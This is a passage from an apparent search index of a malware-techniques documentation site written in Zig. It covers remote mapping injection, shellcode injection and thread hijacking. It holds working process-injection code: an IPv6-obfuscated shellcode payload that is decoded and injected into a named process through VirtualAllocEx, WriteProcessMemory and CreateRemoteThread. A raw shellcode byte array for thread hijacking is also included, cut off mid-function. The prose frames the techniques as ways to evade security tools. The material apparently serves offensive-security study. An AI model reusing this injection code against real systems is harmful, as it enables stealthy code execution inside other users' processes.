Injection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Remote mapping injection is an advanced process injection technique that combines the benefits of mapped memory with cross-process injection capabilities. Unlike traditional injection methods that rely on <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, this technique uses file mapping APIs to create shared memory regions that can be accessed by both the injecting process and the target process.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#remote-mapping-injection_1","title":"Remote Mapping Injection","text":"<p>Remote mapping injection works by creating a file mapping object that can be mapped into multiple processes simultaneously. The technique involves:</p> <ol> <li>Creating a file mapping: Using <code>CreateFileMapping</code> to create a mapping object backed by the paging file</li> <li>Local mapping: Mapping the file into the current process's address space for writing</li> <li>Payload copying: Writing the shellcode to the locally mapped memory</li> <li>Remote mapping: Mapping the same file into the target process's address space with executable permissions</li> <li>Execution: Creating a remote thread to execute the shellcode</li> </ol> <p>This approach offers several advantages:</p> <ul> <li>Shared memory: The same physical memory pages are shared between processes</li> <li>Atomic injection: The payload is written once and becomes immediately available in the target process</li> <li>Memory efficiency: No need to allocate separate memory in the target process</li> <li>Evasion potential: Uses legitimate file mapping APIs instead of traditional injection APIs</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#mapviewoffile2","title":"MapViewOfFile2","text":"<pre><code>// Note: This function cannot be used reliably in Zig\nextern \"kernel32\" fn MapViewOfFile2(\n    FileMappingHandle: HANDLE,\n    ProcessHandle: HANDLE,\n    Offset: u64,\n    BaseAddress: ?*anyopaque,\n    ViewSize: usize,\n    AllocationType: u32,\n    PageProtection: u32,\n) callconv(WINAPI) ?*anyopaque;\n</code></pre> <p>This function is designed to map a view of a file mapping into a specified process. However, it cannot be used reliably in Zig due to compilation and linking issues. Check this GitHub issue for more details about the specific problems encountered when attempting to use this function.</p> <p>The main issues include:</p> <ul> <li>Linker errors: The function may not be properly linked during compilation</li> <li>API availability: Inconsistent availability across different Windows versions</li> <li>Zig compatibility: The function signature may not be fully compatible with Zig's FFI system</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#mapviewoffilenuma2","title":"MapViewOfFileNuma2","text":"<pre><code>extern \"api-ms-win-core-memory-l1-1-5\" fn MapViewOfFileNuma2(\n    FileMappingHandle: HANDLE,\n    ProcessHandle: HANDLE,\n    Offset: u64,\n    BaseAddress: ?*anyopaque,\n    ViewSize: usize,\n    AllocationType: u32,\n    PageProtection: u32,\n    PreferredNode: u32,\n) callconv(windows.WINAPI) ?*anyopaque;\n</code></pre> <p><code>MapViewOfFileNuma2</code> is the NUMA-aware version of <code>MapViewOfFile2</code> and serves as the primary function for remote mapping injection. This function allows mapping a file view into a remote process while specifying NUMA preferences.</p> <p>Parameters:</p> <ul> <li><code>FileMappingHandle</code>: Handle to the file mapping object</li> <li><code>ProcessHandle</code>: Handle to the target process</li> <li><code>Offset</code>: Byte offset in the file where mapping begins</li> <li><code>BaseAddress</code>: Preferred base address (can be null for system choice)</li> <li><code>ViewSize</code>: Size of the mapping (0 for entire file)</li> <li><code>AllocationType</code>: Memory allocation type (typically 0)</li> <li><code>PageProtection</code>: Memory protection flags (e.g., <code>PAGE_EXECUTE_READWRITE</code>)</li> <li><code>PreferredNode</code>: NUMA node preference (<code>NUMA_NO_PREFERRED_NODE</code> for no preference)</li> </ul> <p>Key Features:</p> <ul> <li>Cross-process mapping: Can map memory into remote processes</li> <li>NUMA awareness: Allows specification of preferred NUMA nodes</li> <li>Flexible permissions: Can set different memory protection flags</li> <li>System integration: Part of the Windows API memory management system</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#note","title":"Note","text":"<p>Unlike local mapping injection, this technique doesn't require the locally mapped memory to be executable because the payload runs in the remote process, not locally. The local process maps the shared memory with <code>FILE_MAP_WRITE</code> to copy or decrypt the payload. Then, <code>MapViewOfFile2</code> (<code>MapViewOfFileNuma2</code>) is used to map the same memory region into the target process. Since both views share the same file mapping handle, any changes made locally \u2014 such as decrypting the payload \u2014 are automatically reflected in the remote process\u2019s memory. This is useful for real-world scenarios where the payload is encrypted: the attacker can map it into the remote process, decrypt it locally, and then trigger execution remotely, without ever exposing the raw payload in the local process. This approach improves stealth and avoids using direct remote memory writing.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#remotemapinject-function","title":"remoteMapInject Function","text":"<p>The core function that implements remote mapping injection:</p> <pre><code>fn remoteMapInject(hProcess: HANDLE, pPayload: []const u8, ppAddress: *?PVOID) bool {\n    var bState: bool = true;\n    var hFile: ?HANDLE = null;\n    var pMapLocalAddress: ?PVOID = null;\n    var pMapRemoteAddress: ?PVOID = null;\n\n    // Create a file mapping handle with RWX memory permissions\n    hFile = CreateFileMappingW(\n        INVALID_HANDLE_VALUE,\n        null,\n        PAGE_EXECUTE_READWRITE,\n        0,\n        @intCast(pPayload.len),\n        null,\n    );\n\n    if (hFile == null) {\n        print(\"\\t[!] CreateFileMapping Failed With Error : {}\\n\", .{windows.kernel32.GetLastError()});\n        bState = false;\n        ppAddress.* = null;\n        return bState;\n    }\n\n    // Map the view locally for writing\n    pMapLocalAddress = MapViewOfFile(\n        hFile.?,\n        FILE_MAP_WRITE,\n        0,\n        0,\n        pPayload.len,\n    );\n\n    if (pMapLocalAddress == null) {\n        print(\"\\t[!] MapViewOfFile Failed With Error : {}\\n\", .{windows.kernel32.GetLastError()});\n        bState = false;\n        ppAddress.* = null;\n        if (hFile) |handle| _ = CloseHandle(handle);\n        return bState;\n    }\n\n    print(\"\\t[+] Local Mapping Address : 0x{X}\\n\", .{@intFromPtr(pMapLocalAddress.?)});\n\n    // Copy payload to local mapping\n    const dest = @as([*]u8, @ptrCast(pMapLocalAddress.?));\n    @memcpy(dest[0..pPayload.len], pPayload);\n\n    // Map the same file into the remote process with execute permissions\n    pMapRemoteAddress = MapViewOfFileNuma2(\n        hFile.?,\n        hProcess,\n        0,\n        null,\n        0,\n        0,\n        PAGE_EXECUTE_READWRITE,\n        NUMA_NO_PREFERRED_NODE,\n    );\n\n    if (pMapRemoteAddress == null) {\n        print(\"\\t[!] MapViewOfFileNuma2 Failed With Error : {}\\n\", .{windows.kernel32.GetLastError()});\n        bState = false;\n        ppAddress.* = null;\n        if (hFile) |handle| _ = CloseHandle(handle);\n        return bState;\n    }\n\n    print(\"\\t[+] Remote Mapping Address : 0x{X}\\n\", .{@intFromPtr(pMapRemoteAddress.?)});\n\n    ppAddress.* = pMapRemoteAddress;\n    if (hFile) |handle| _ = CloseHandle(handle);\n    return bState;\n}\n</code></pre> <p>Process Flow:</p> <ol> <li>File mapping creation: Creates a file mapping object backed by the paging file</li> <li>Local mapping: Maps the file locally with write permissions for payload copying</li> <li>Payload writing: Copies the shellcode to the locally mapped memory</li> <li>Remote mapping: Maps the same file into the target process with execute permissions</li> <li>Address return: Returns the remote mapping address for thread creation</li> </ol> <p>Key Advantages:</p> <ul> <li>Shared memory: Both processes access the same physical memory pages</li> <li>Atomic operation: Payload becomes available in target process immediately after local write</li> <li>Memory efficiency: No need for separate allocation and copying in target process</li> <li>Legitimate APIs: Uses standard Windows memory management APIs</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#unmapviewoffile","title":"UnmapViewOfFile","text":"<pre><code>extern \"kernel32\" fn UnmapViewOfFile(lpBaseAddress: PVOID) callconv(WINAPI) BOOL;\n</code></pre> <p>While not used in this specific implementation, <code>UnmapViewOfFile</code> is crucial for proper cleanup of mapped memory regions. It unmaps a mapped view of a file from the calling process's address space.</p> <p>Usage scenarios:</p> <ul> <li>Cleanup: Removing mapped memory regions when no longer needed</li> <li>Security: Preventing memory leaks and unauthorized access</li> <li>Resource management: Proper handling of system resources</li> </ul> <p>Example usage:</p> <pre><code>// Clean up local mapping\nif (pMapLocalAddress) |addr| {\n    if (UnmapViewOfFile(addr) == 0) {\n        print(\"[!] UnmapViewOfFile failed: {}\\n\", .{windows.kernel32.GetLastError()});\n    }\n}\n</code></pre> <p>Important notes:</p> <ul> <li>Must be called from the same process that created the mapping</li> <li>Does not affect mappings in other processes</li> <li>Should be called before closing the file mapping handle</li> <li>Failure to unmap can lead to resource leaks</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#key-benefits","title":"Key Benefits","text":"<ol> <li>Shared Memory Architecture: Uses the same physical memory pages for both processes</li> <li>Atomic Injection: Payload becomes available immediately after local write</li> <li>Memory Efficiency: No separate allocation in target process required</li> <li>Evasion Potential: Uses legitimate Windows memory management APIs</li> <li>Cross-Process Capability: Can inject into remote processes with proper permissions</li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/#limitations","title":"Limitations","text":"<ol> <li>Windows Version Dependency: Requires Windows 10 version 1803 or later</li> <li>Permission Requirements: Needs appropriate process access rights</li> <li>API Availability: May not be available on all systems</li> <li>Detection: Advanced security solutions may still detect the technique</li> <li>Complexity: More complex than traditional injection methods</li> </ol> <p>Remote mapping injection represents an advanced technique that leverages Windows' memory management architecture to achieve cross-process code injection while potentially evading some security controls.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Shellcode-Injection/shellcode_injection/","title":"Shellcode Injection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Shellcode-Injection/shellcode_injection/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Shellcode injection writes raw machine code into the memory of another process and then executes it. Typically the attacker opens the target process with the required permissions, allocates executable memory, copies the shellcode bytes, and starts a remote thread at that location. The sample in this repository obfuscates the payload as an array of IPv6 strings, then decodes and injects the resulting buffer. This technique provides complete control over the victim process and is frequently used for privilege escalation or to hide malicious behavior behind a trusted process.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Shellcode-Injection/shellcode_injection/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst net = std.net;\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\nconst IPV6_ARRAY: [17][]const u8 = [_][]const u8{\n    \"FC48:83E4:F0E8:C000:0000:4151:4150:5251\",\n    \"5648:31D2:6548:8B52:6048:8B52:1848:8B52\",\n    \"2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0\",\n    \"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED\",\n    \"5241:5148:8B52:208B:423C:4801:D08B:8088\",\n    \"0000:0048:85C0:7467:4801:D050:8B48:1844\",\n    \"8B40:2049:01D0:E356:48FF:C941:8B34:8848\",\n    \"01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1\",\n    \"38E0:75F1:4C03:4C24:0845:39D1:75D8:5844\",\n    \"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49\",\n    \"01D0:418B:0488:4801:D041:5841:585E:595A\",\n    \"4158:4159:415A:4883:EC20:4152:FFE0:5841\",\n    \"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000\",\n    \"0000:0000:0048:8D8D:0101:0000:41BA:318B\",\n    \"6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF\",\n    \"D548:83C4:283C:067C:0A80:FBE0:7505:BB47\",\n    \"1372:6F6A:0059:4189:DAFF:D563:616C:6300\",\n};\n\nconst NUMBER_OF_ELEMENTS: usize = 17;\n\n// Windows API types\nconst HANDLE = windows.HANDLE;\nconst DWORD = windows.DWORD;\nconst BOOL = windows.BOOL;\nconst LPVOID = *anyopaque;\nconst LPCWSTR = [*:0]const u16;\nconst SIZE_T = usize;\nconst PVOID = *anyopaque;\n\n// Process access rights\nconst PROCESS_ALL_ACCESS = 0x001F0FFF;\n\n// Memory allocation constants\nconst MEM_COMMIT = 0x1000;\nconst MEM_RESERVE = 0x2000;\nconst PAGE_READWRITE = 0x04;\nconst PAGE_EXECUTE_READWRITE = 0x40;\n\n// Snapshot constants\nconst TH32CS_SNAPPROCESS = 0x00000002;\nconst INVALID_HANDLE_VALUE = @as(windows.HANDLE, @ptrFromInt(std.math.maxInt(usize)));\n\n// Process entry structure\nconst PROCESSENTRY32W = extern struct {\n    dwSize: DWORD,\n    cntUsage: DWORD,\n    th32ProcessID: DWORD,\n    th32DefaultHeapID: usize,\n    th32ModuleID: DWORD,\n    cntThreads: DWORD,\n    th32ParentProcessID: DWORD,\n    pcPriClassBase: i32,\n    dwFlags: DWORD,\n    szExeFile: [260]u16,\n};\n\n// Windows API function declarations\nextern \"kernel32\" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(.C) HANDLE;\nextern \"kernel32\" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(.C) BOOL;\nextern \"kernel32\" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(.C) BOOL;\nextern \"kernel32\" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(.C) ?HANDLE;\nextern \"kernel32\" fn VirtualAllocEx(HANDLE, ?LPVOID, SIZE_T, DWORD, DWORD) callconv(.C) ?LPVOID;\nextern \"kernel32\" fn WriteProcessMemory(HANDLE, LPVOID, ?*const anyopaque, SIZE_T, ?*SIZE_T) callconv(.C) BOOL;\nextern \"kernel32\" fn VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, *DWORD) callconv(.C) BOOL;\nextern \"kernel32\" fn CreateRemoteThread(HANDLE, ?*anyopaque, SIZE_T, *const fn (?LPVOID) callconv(.C) DWORD, ?LPVOID, DWORD, ?*DWORD) callconv(.C) ?HANDLE;\nextern \"kernel32\" fn CloseHandle(HANDLE) callconv(.C) BOOL;\nextern \"kernel32\" fn GetLastError() callconv(.C) DWORD;\n\n// Helper function to wait for Enter key\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\n// Convert UTF-8 string to wide string\nfn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![:0]u16 {\n    return try std.unicode.utf8ToUtf16LeAllocZ(allocator, utf8_str);\n}\n\n/// Compare wide strings (case-insensitive)\n/// Similar to `wcscmp` in C\nfn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {\n    if (str1.len != str2.len) return false;\n\n    for (str1, str2) |c1, c2| {\n        var lower_c1 = c1;\n        var lower_c2 = c2;\n\n        if (c1 &gt;= 'A' and c1 &lt;= 'Z') lower_c1 = c1 + ('a' - 'A');\n        if (c2 &gt;= 'A' and c2 &lt;= 'Z') lower_c2 = c2 + ('a' - 'A');\n\n        if (lower_c1 != lower_c2) return false;\n    }\n    return true;\n}\n\nfn ipv6Deobfuscation(ipv6_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {\n    var buffer = try allocator.alloc(u8, ipv6_array.len * 16);\n    var offset: usize = 0;\n\n    for (ipv6_array) |ip| {\n        const addr = net.Address.parseIp6(ip, 0) catch return error.InvalidIpFormat;\n        const ip_bytes = @as([16]u8, @bitCast(addr.in6.sa.addr));\n        @memcpy(buffer[offset .. offset + 16], &amp;ip_bytes);\n        offset += 16;\n    }\n\n    return buffer;\n}\n\n// Get remote process handle by name\nfn getRemoteProcessHandle(allocator: std.mem.Allocator, process_name: []const u8) !struct { pid: DWORD, handle: HANDLE } {\n    const wide_process_name = try convertToWideString(allocator, process_name);\n    defer allocator.free(wide_process_name);\n\n    print(\"[i] Searching For Process Id Of \\\"{s}\\\" ... \", .{process_name});\n\n    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snapshot == INVALID_HANDLE_VALUE) {\n        print(\"[!] CreateToolhelp32Snapshot Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.SnapshotFailed;\n    }\n    defer _ = CloseHandle(snapshot);\n\n    var process_entry = PROCESSENTRY32W{\n        .dwSize = @sizeOf(PROCESSENTRY32W),\n        .cntUsage = 0,\n        .th32ProcessID = 0,\n        .th32DefaultHeapID = 0,\n        .th32ModuleID = 0,\n        .cntThreads = 0,\n        .th32ParentProcessID = 0,\n        .pcPriClassBase = 0,\n        .dwFlags = 0,\n        .szExeFile = std.mem.zeroes([260]u16),\n    };\n\n    if (Process32FirstW(snapshot, &amp;process_entry) == 0) {\n        print(\"[!] Process32FirstW Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.ProcessEnumFailed;\n    }\n\n    while (true) {\n        var exe_name_len: usize = 0;\n        while (exe_name_len &lt; process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {\n            exe_name_len += 1;\n        }\n\n        const exe_name = process_entry.szExeFile[0..exe_name_len];\n\n        if (compareWideStringsIgnoreCase(exe_name, wide_process_name)) {\n            print(\"[+] DONE \\n\", .{});\n            print(\"[i] Found Target Process Pid: {d} \\n\", .{process_entry.th32ProcessID});\n\n            const handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID) orelse {\n                print(\"[!] OpenProcess Failed With Error : {d} \\n\", .{GetLastError()});\n                return error.OpenProcessFailed;\n            };\n\n            return .{ .pid = process_entry.th32ProcessID, .handle = handle };\n        }\n\n        if (Process32NextW(snapshot, &amp;process_entry) == 0) {\n            break;\n        }\n    }\n\n    print(\"[!] Process is Not Found \\n\", .{});\n    return error.ProcessNotFound;\n}\n\n// Inject shellcode to remote process\nfn injectShellcodeToRemoteProcess(process_handle: HANDLE, shellcode: []const u8) !void {\n    const shellcode_address = VirtualAllocEx(\n        process_handle,\n        null,\n        shellcode.len,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_READWRITE,\n    ) orelse {\n        print(\"[!] VirtualAllocEx Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.VirtualAllocExFailed;\n    };\n\n    print(\"[i] Allocated Memory At : 0x{X} \\n\", .{@intFromPtr(shellcode_address)});\n\n    print(\"[#] Press &lt;Enter&gt; To Write Payload ... \", .{});\n    waitForEnter();\n\n    var bytes_written: SIZE_T = 0;\n    const write_result = WriteProcessMemory(\n        process_handle,\n        shellcode_address,\n        shellcode.ptr,\n        shellcode.len,\n        &amp;bytes_written,\n    );\n\n    if (write_result == 0 or bytes_written != shellcode.len) {\n        print(\"[!] WriteProcessMemory Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.WriteProcessMemoryFailed;\n    }\n\n    print(\"[i] Successfully Written {d} Bytes\\n\", .{bytes_written});\n\n    // Clear the shellcode from local memory\n    @memset(@constCast(shellcode.ptr)[0..shellcode.len], 0);\n\n    var old_protection: DWORD = 0;\n    if (VirtualProtectEx(process_handle, shellcode_address, shellcode.len, PAGE_EXECUTE_READWRITE, &amp;old_protection) == 0) {\n        print(\"[!] VirtualProtectEx Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.VirtualProtectExFailed;\n    }\n\n    print(\"[#] Press &lt;Enter&gt; To Run ... \", .{});\n    waitForEnter();\n    print(\"[i] Executing Payload ... \", .{});\n\n    const thread_handle = CreateRemoteThread(\n        process_handle,\n        null,\n        0,\n        @ptrCast(shellcode_address),\n        null,\n        0,\n        null,\n    ) orelse {\n        print(\"[!] CreateRemoteThread Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.CreateRemoteThreadFailed;\n    };\n\n    print(\"[+] DONE !\\n\", .{});\n\n    _ = CloseHandle(thread_handle);\n}\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    const args = try std.process.argsAlloc(allocator);\n    defer std.process.argsFree(allocator, args);\n\n    if (args.len &lt; 2) {\n        print(\"[!] Usage : \\\"{s}\\\" &lt;Process Name&gt; \\n\", .{args[0]});\n        std.process.exit(1);\n    }\n\n    const process_name = args[1];\n\n    const process_info = getRemoteProcessHandle(allocator, process_name) catch |err| switch (err) {\n        error.ProcessNotFound =&gt; {\n            print(\"[!] Process is Not Found \\n\", .{});\n            std.process.exit(1);\n        },\n        else =&gt; {\n            print(\"[!] Failed to get process handle\\n\", .{});\n            std.process.exit(1);\n        },\n    };\n    defer _ = CloseHandle(process_info.handle);\n\n    print(\"[#] Press &lt;Enter&gt; To Decrypt ... \", .{});\n    waitForEnter();\n    print(\"[i] Decrypting ...\", .{});\n\n    const shellcode = ipv6Deobfuscation(&amp;IPV6_ARRAY, allocator) catch {\n        print(\"[!] IPv6 deobfuscation failed\\n\", .{});\n        std.process.exit(1);\n    };\n    defer allocator.free(shellcode);\n\n    print(\"[+] DONE !\\n\", .{});\n    print(\"[i] Deobfuscated Payload At : 0x{X} Of Size : {d} \\n\", .{ @intFromPtr(shellcode.ptr), shellcode.len });\n\n    injectShellcodeToRemoteProcess(process_info.handle, shellcode) catch |err| {\n        print(\"[!] Shellcode injection failed: {}\\n\", .{err});\n        std.process.exit(1);\n    };\n\n    print(\"[#] Press &lt;Enter&gt; To Quit ... \", .{});\n    waitForEnter();\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/local_thread_creation/","title":"Local Thread Creation","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/local_thread_creation/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Local thread creation is a stealthy way to run shellcode within the context of the current process. Instead of launching an entirely new program, the malware spawns a thread in a suspended state and alters its execution context so the instruction pointer jumps to the payload. When resumed, the thread appears to be part of the normal application yet secretly executes arbitrary code. This approach avoids creating new processes and helps the malicious activity blend in with legitimate threads, making casual inspection much harder.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/local_thread_creation/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>// NOTE:\n// We run our payload in a hijacked thread instead of the one we created.\n// This is because the entry of the thread we created must pointed to the\n// base address of our payload in memory, while the hijacked one will pointed\n// to the normal process function, so it will let the thread seems harmless,\n// which is a good news for us.\n\nconst std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Windows API types\nconst HANDLE = windows.HANDLE;\nconst DWORD = windows.DWORD;\nconst BOOL = windows.BOOL;\nconst PVOID = windows.PVOID;\nconst PBYTE = [*]u8;\nconst SIZE_T = windows.SIZE_T;\nconst WINAPI = windows.WINAPI;\nconst LPTHREAD_START_ROUTINE = *const fn (?*anyopaque) callconv(WINAPI) DWORD;\n\n// Memory protection constants\nconst PAGE_READWRITE: DWORD = windows.PAGE_READWRITE;\nconst PAGE_EXECUTE_READWRITE: DWORD = windows.PAGE_EXECUTE_READWRITE;\nconst MEM_COMMIT: DWORD = windows.MEM_COMMIT;\nconst MEM_RESERVE: DWORD = windows.MEM_RESERVE;\n\n// Thread creation constants\nconst CREATE_SUSPENDED: DWORD = 0x00000004;\nconst INFINITE: DWORD = 0xFFFFFFFF;\n\n// Context flags\nconst CONTEXT_CONTROL: DWORD = 0x00000001;\nconst CONTEXT_ALL: DWORD = 0x00100000 | 0x00000001 | 0x00000002 | 0x00000004 | 0x00000008 | 0x00000010;\n\n// Thread context structure for x64\nconst CONTEXT = extern struct {\n    // Register parameter home addresses (reserved for debugger use)\n    P1Home: u64,\n    P2Home: u64,\n    P3Home: u64,\n    P4Home: u64,\n    P5Home: u64,\n    P6Home: u64,\n\n    // Control flags\n    ContextFlags: DWORD,\n    MxCsr: DWORD,\n\n    // Segment registers and processor flags\n    SegCs: u16,\n    SegDs: u16,\n    SegEs: u16,\n    SegFs: u16,\n    SegGs: u16,\n    SegSs: u16,\n    EFlags: DWORD,\n\n    // Debug registers\n    Dr0: u64,\n    Dr1: u64,\n    Dr2: u64,\n    Dr3: u64,\n    Dr6: u64,\n    Dr7: u64,\n\n    // Integer registers\n    Rax: u64,\n    Rcx: u64,\n    Rdx: u64,\n    Rbx: u64,\n    Rsp: u64,\n    Rbp: u64,\n    Rsi: u64,\n    Rdi: u64,\n    R8: u64,\n    R9: u64,\n    R10: u64,\n    R11: u64,\n    R12: u64,\n    R13: u64,\n    R14: u64,\n    R15: u64,\n\n    // Program counter\n    Rip: u64,\n\n    // Floating point state\n    FltSave: [512]u8, // XMM_SAVE_AREA32\n\n    // Vector registers\n    VectorRegister: [26][16]u8,\n    VectorControl: u64,\n\n    // Special debug control registers\n    DebugControl: u64,\n    LastBranchToRip: u64,\n    LastBranchFromRip: u64,\n    LastExceptionToRip: u64,\n    LastExceptionFromRip: u64,\n};\n\n// External function declarations\nextern \"kernel32\" fn CreateThread(\n    lpThreadAttributes: ?*anyopaque,\n    dwStackSize: SIZE_T,\n    lpStartAddress: LPTHREAD_START_ROUTINE,\n    lpParameter: ?*anyopaque,\n    dwCreationFlags: DWORD,\n    lpThreadId: ?*DWORD,\n) callconv(WINAPI) ?HANDLE;\n\nextern \"kernel32\" fn VirtualAlloc(\n    lpAddress: ?*anyopaque,\n    dwSize: SIZE_T,\n    flAllocationType: DWORD,\n    flProtect: DWORD,\n) callconv(WINAPI) ?*anyopaque;\n\nextern \"kernel32\" fn VirtualProtect(\n    lpAddress: *anyopaque,\n    dwSize: SIZE_T,\n    flNewProtect: DWORD,\n    lpflOldProtect: *DWORD,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn GetThreadContext(\n    hThread: HANDLE,\n    lpContext: *CONTEXT,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn SetThreadContext(\n    hThread: HANDLE,\n    lpContext: *const CONTEXT,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;\nextern \"kernel32\" fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) callconv(WINAPI) DWORD;\nextern \"kernel32\" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) DWORD;\n\nconst calc_payload = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };\n\n// Dummy function to use for the sacrificial thread\nfn DummyFunction(lpParameter: ?*anyopaque) callconv(WINAPI) DWORD {\n    _ = lpParameter; // Suppress unused parameter warning\n\n    // Stupid code\n    const seed = @as(u32, @intCast(std.time.timestamp()));\n    var prng = std.Random.DefaultPrng.init(seed);\n    const j = prng.random().int(i32);\n    const i = j *% j; // Use wrapping multiplication to avoid overflow\n    _ = i; // Suppress unused variable warning\n\n    return 0;\n}\n\n// Thread hijacking function\nfn runViaClassicThreadHijacking(hThread: HANDLE, pPayload: []const u8) bool {\n    var pAddress: ?*anyopaque = null;\n    var dwOldProtection: DWORD = 0;\n\n    // .ContextFlags can be CONTEXT_CONTROL or CONTEXT_ALL as well\n    var ThreadCtx = 